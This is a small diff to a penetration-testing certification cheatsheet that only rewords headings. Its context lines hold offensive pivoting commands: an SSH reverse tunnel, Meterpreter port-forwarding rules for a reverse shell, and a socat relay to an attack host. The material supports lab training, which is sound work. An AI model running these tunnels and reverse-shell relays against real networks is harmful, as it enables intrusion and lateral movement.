@@ -52,9 +52,9 @@ HackTheBox Certified Penetration Tester Specialist Cheatsheet
     - [Attacking Email Services](#attacking-email-services)
 - [Pivoting, Tunneling, and Port Forwarding](#pivoting-tunneling-and-port-forwarding)
     - [Dynamic Port Forwarding with SSH and SOCKS Tunneling](#dynamic-port-forwarding-with-ssh-and-socks-tunneling)
-    - [Remote and Reverse Port Forwarding with SSH](#remote-and-reverse-port-forwarding-with-ssh)
+    - [Remote or Reverse Port Forwarding with SSH](#remote-or-reverse-port-forwarding-with-ssh)
     - [Meterpreter Tunneling and Port Forwarding](#meterpreter-tunneling-and-port-forwarding)
-    - [Socat Redirection with a Reverse Shell and Bind Shell](#Socat-Redirection-with-a-Reverse-Shell-and-Bind-Shell)
+    - [Socat Redirection with a Reverse Shell or Bind Shell](#Socat-Redirection-with-a-Reverse-Shell-or-Bind-Shell)
     - [SSH for Windows with Plink](#SSH-for-Windows-with-plink)
     - [SSH Pivoting with Sshuttle](#SSH-Pivoting-with-Sshuttle)
     - [Web Server Pivoting with Rpivot](#Web-Server-Pivoting-with-Rpivot)
@@ -1002,7 +1002,7 @@ or
 ssh -D 1080 ubuntu@<IPaddressofTarget>
 /etc/proxychains.conf  need have (socks5 	127.0.0.1 1080)
 ```
-##### Remote and Reverse Port Forwarding with SSH
+##### Remote or Reverse Port Forwarding with SSH
 ```
 # SSH command used to create a reverse SSH tunnel from a target to an attack host. Traffic is forwarded on port 8080 on the attack host to port 80 on the target.
 ssh -R <InternalIPofPivotHost>:8080:0.0.0.0:80 ubuntu@<ipAddressofTarget> -vN
@@ -1015,7 +1015,7 @@ meterpreter > portfwd add -l 3300 -p 3389 -r <IPaddressofTarget>
 # Meterpreter-based portfwd command that adds a forwarding rule that directs traffic coming on on port 8081 to the port 1234 listening on the IP address of the Attack Host. (Reverse Shell)
 meterpreter > portfwd add -R -l 8081 -p 1234 -L <IPaddressofAttackHost>
 ```
-##### Socat Redirection with a Reverse Shell and Bind Shell
+##### Socat Redirection with a Reverse Shell or Bind Shell
 ```
 # Uses Socat to listen on port 8080 and then to fork when the connection is received. It will then connect to the attack host on port 80. (Reverse Shell)
 socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80
